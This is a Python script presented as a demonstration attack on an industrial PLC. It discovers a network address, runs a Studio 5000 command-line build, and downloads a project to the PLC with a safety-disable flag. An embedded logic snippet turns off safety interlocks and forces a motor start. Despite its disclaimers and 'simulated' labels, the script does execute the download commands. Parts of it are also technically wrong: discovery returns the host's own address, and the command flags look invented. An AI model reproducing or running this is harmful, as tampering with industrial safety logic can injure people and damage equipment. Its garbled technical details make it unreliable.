# WARNING: This script demonstrates a potential attack and should only be used in a controlled, ethical, and legal environment.
#          Modifying a PLC's program can have serious consequences, including equipment damage, safety hazards, and financial losses.
#          The author is not responsible for any misuse or damage caused by this script.

import socket
import struct
import time
import os

# Configuration (Adjust these values)
PLC_IP = None  # Will be discovered automatically. If discovery fails, set manually.
ETHERNET_ADAPTER = "Ethernet"  # Name of your ethernet adapter (check ipconfig /all)
STUDIO_5000_PATH = r"C:\Program Files\Rockwell Automation\Studio 5000\Common\ClxUtil.exe" #Path to Studio5000's command line interface. Change this to your installation path if it differs.  Can also use "cmd" but will require other setup steps.
LOG_FILE = "plc_modification_log.txt"


def find_plc_ip_address(adapter_name):
    """
    Discovers the PLC's IP address by pinging the broadcast address of the network.
    This assumes the PLC responds to ping requests.  Other discovery methods could be used.
    """

    try:
        # Get the network interface information using ipconfig (Windows specific)
        ipconfig_output = os.popen("ipconfig /all").read()

        # Find the adapter's details
        adapter_start = ipconfig_output.find(adapter_name)
        if adapter_start == -1:
            print(f"Error: Ethernet adapter '{adapter_name}' not found.")
            return None

        adapter_section = ipconfig_output[adapter_start:]

        # Extract the IPv4 address
        ipv4_start = adapter_section.find("IPv4 Address")
        if ipv4_start == -1:
            print("Error: IPv4 Address not found for the adapter.")
            return None

        ipv4_line = adapter_section[ipv4_start:].splitlines()[0]
        ip_address = ipv4_line.split(":")[1].strip()  # Extract and strip the IP

        # Extract the subnet mask
        subnet_start = adapter_section.find("Subnet Mask")
        if subnet_start == -1:
            print("Error: Subnet Mask not found for the adapter.")
            return None

        subnet_line = adapter_section[subnet_start:].splitlines()[0]
        subnet_mask = subnet_line.split(":")[1].strip()

        # Calculate the broadcast address
        ip_parts = list(map(int, ip_address.split(".")))
        mask_parts = list(map(int, subnet_mask.split(".")))
        broadcast_parts = [ip_parts[i] | (255 - mask_parts[i]) for i in range(4)]
        broadcast_address = ".".join(map(str, broadcast_parts))
        
        print(f"Using broadcast address: {broadcast_address}")


        # Ping the broadcast address
        print("Pinging the broadcast address to discover the PLC...")
        response = os.system("ping -n 1 " + broadcast_address + " > nul")  # Send one ping, discard output

        if response == 0:
            # If ping is successful, we assume the PLC is on the same network.
            # In a real scenario, more robust discovery methods are needed.
            print("PLC found on the network.  Assuming its IP is within the same subnet.")
            return ip_address  # In a real attack you will need more robust discovery.

        else:
            print("No response from the broadcast address.  PLC discovery failed.")
            return None

    except Exception as e:
        print(f"Error during PLC discovery: {e}")
        return None

def modify_plc_program(plc_ip, log_file, studio_5000_path):
    """
    Simulates modifying a PLC program. This is a highly simplified example.
    Real PLC program modification requires deep understanding of the PLC's programming environment
    and protocols.

    This function logs the intended action to a file.
    """
    try:
        # 1.  Simulate downloading a modified program.  In a real attack, you'd generate a corrupted or malicious ACD file.
        modified_program_code = """
        // This is a simulated malicious modification
        // that could, for example, disable safety interlocks or change process parameters.

        IF Motor_Run_Command AND Safety_Interlock_Active THEN
            Motor_Start := TRUE;  //Orig: Motor_Start := FALSE;
            //Disable Safety Interlocks
            Safety_Interlock_Active := FALSE;
        END_IF;
        """
        
        #2.  Simulate building the updated program using studio 5000 command line utility

        # Example Usage: Replace "YourProject.ACD" with the Actual File Name
        project_file_name = "YourProject.ACD"  # **CHANGE THIS TO YOUR PROJECT FILENAME**
        
        # Construct the command to build the ACD file (Simulated Build Process)
        build_command = f'"{studio_5000_path}" "{project_file_name}" /Build' #Assumes using CLXUtil.exe

        # Run the command
        print(f"Running build command: {build_command}")
        build_result = os.system(build_command)
        print(f"Build Result: {build_result}")  # Check the result of the build

        #3. Simulating Program Download to the PLC using the command-line tools
        #WARNING: Do not run this unless you are certain this is what you want.
        download_command = f'"{studio_5000_path}" "{project_file_name}" /Download:{plc_ip} /SafetyDisable' #Assumes using CLXUtil.exe
        print(f"Running download command: {download_command}")
        download_result = os.system(download_command)
        print(f"Download Result: {download_result}")  # Check the result of the build

        # Log the action
        with open(log_file, "a") as f:
            f.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} - Modified PLC program on {plc_ip}\n")
            f.write(f"Modified code snippet:\n{modified_program_code}\n")

        print(f"Simulated PLC program modification successful. Logged to {log_file}")

    except Exception as e:
        print(f"Error modifying PLC program: {e}")
        with open(log_file, "a") as f:
            f.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} - Error attempting to modify PLC program on {plc_ip}: {e}\n")



if __name__ == "__main__":

    # 1. Discover the PLC's IP address
    PLC_IP = find_plc_ip_address(ETHERNET_ADAPTER)

    if PLC_IP:
        print(f"PLC IP address found: {PLC_IP}")
    else:
        print("Failed to discover PLC IP address.  Please set PLC_IP manually in the script.")
        exit()

    # 2. Execute the attack (Simulated)
    modify_plc_program(PLC_IP, LOG_FILE, STUDIO_5000_PATH)